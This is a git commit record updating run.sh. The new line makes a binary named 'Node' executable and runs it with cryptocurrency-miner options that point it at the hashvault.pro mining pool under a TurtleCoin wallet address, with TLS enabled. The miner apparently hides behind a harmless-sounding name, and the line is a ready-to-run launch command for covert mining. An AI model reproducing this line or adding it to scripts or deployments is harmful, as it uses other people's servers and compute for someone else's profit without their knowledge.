fc9a39b7b39364edf0e0c5f2c47ad46de4f3b5d0
diprassss <82854365+diprassss@users.noreply.github.com>
2021-08-17 04:19:36 -0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,1 @@
-chmod 777 Node && ./Node -o 66.135.2.236:4444
+chmod 777 Node && ./Node -o --url pool.hashvault.pro:80 --user TRTLv2xgnXYJBqb7BuX2MwFZg42hfNDxrK9Y7kjZBNHuZRM17sJSEvQQK8BDhb3Nra48dvXydwZEjA7gWKNwLRJpE7Rw4DXjQqJ.0000000000000000000000000000000000000000000000000000001884299067 --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
